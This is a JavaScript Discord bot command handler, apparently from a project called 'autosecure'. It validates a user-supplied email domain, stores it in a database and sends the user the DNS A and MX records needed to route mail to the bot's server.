const { queryParams } = require("../../../db/database");
const { EmbedBuilder } = require("discord.js");
const config = require('../../../config.json');
const listSettings = require("../../../autosecure/utils/settings/listSettings");
const listConfiguration = require("../../../autosecure/utils/settings/listSettings");

const isValidDomain = (domain) => {
    const regex = /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return regex.test(domain);
};

module.exports = {
    name: "emaildomain",
    editsettings: true,
    callback: async (client, interaction) => {
        console.log(`interactioncustomid: ${interaction.customId}`)
        let resetdomain;
        let settings;
        let newMessage;
        let domain = interaction.components?.[0]?.components?.[0]?.value?.trim();

        const isconfig = interaction.customId?.includes("|"); 

        if (!domain || domain === "" || domain === config.domains[0]) {
            domain = config.domains[0];
            resetdomain = true;
        }

        console.log(`reset: ${resetdomain}, ${isconfig}`)

        settings = isconfig
            ? await client.queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id])
            : await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [interaction.user.id]);

        if (settings.length === 0) {
            return interaction.reply({
                content: `Couldn't find your settings! Report this to an admin!`,
                ephemeral: true
            });
        }

        if (!isValidDomain(domain) || domain === settings[0].domain) {
            return interaction.reply({
                content: `Invalid domain or already set!`,
                ephemeral: true
            });
        }

        if (isconfig) {
            await client.queryParams(`UPDATE secureconfig SET domain=? WHERE user_id=?`, [domain, interaction.user.id]);
        } else {
            await client.queryParams(`UPDATE autosecure SET domain=? WHERE user_id=?`, [domain, interaction.user.id]);
        }

        const embed = new EmbedBuilder()
            .setDescription(`If you want to use my emailer for your domain (optional): In your domain registrar (e.g., Namecheap, GoDaddy, etc.), create the DNS records with the following:\n\n\`\`\`\nType: A\nName: ${domain}\nContent/Value: ${config.vpsip}\nTTL: Automatic\n\`\`\`\n\n\`\`\`\nType: MX\nName: ${domain}\nContent/Value: ${domain}\nPriority: 10\nTTL: Automatic\n\`\`\``)
            .setFooter({ text: "Note: It may take up to 72h for the records to be updated." })
            .setColor("#b2c7e0");

        if (!resetdomain) {
            await interaction.user.send({ embeds: [embed] });
        }

        newMessage = isconfig
            ? await listConfiguration(interaction.user.id)
            : await listSettings(client, client.username, false);

        newMessage.content = resetdomain
            ? "Your domain has been reset!"
            : "The domain has successfully been sent, check your DMs for additional details!";
        return interaction.update(newMessage);
    }
};
